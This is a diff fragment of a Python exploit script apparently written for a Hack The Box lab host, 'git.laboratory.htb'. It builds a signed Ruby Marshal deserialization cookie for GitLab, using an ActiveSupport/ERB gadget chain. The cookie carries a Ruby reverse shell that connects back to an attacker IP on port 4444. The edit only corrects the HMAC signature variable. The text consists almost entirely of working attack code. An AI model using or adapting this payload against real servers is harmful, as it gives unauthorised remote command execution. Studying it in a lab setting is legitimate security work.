@@ -16,7 +16,7 @@ port = '4444'
 code='\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"\x01\x80`ruby -rsocket -e \'exit if fork;c=TCPSocket.new(\"'+ip+'\",'+port+');while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'`\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT'
 
 cookie_signature = hmac.new(key, base64.b64encode(code), sha1)
-payload =base64.b64encode(code)+'--'+h.hexdigest()
+payload =base64.b64encode(code)+'--'+cookie_signature.hexdigest()
 cookies = {'experimentation_subject_id':payload}
 res = requests.get("https://git.laboratory.htb/users/sign_in",cookies=cookies,verify=False)
 print payload
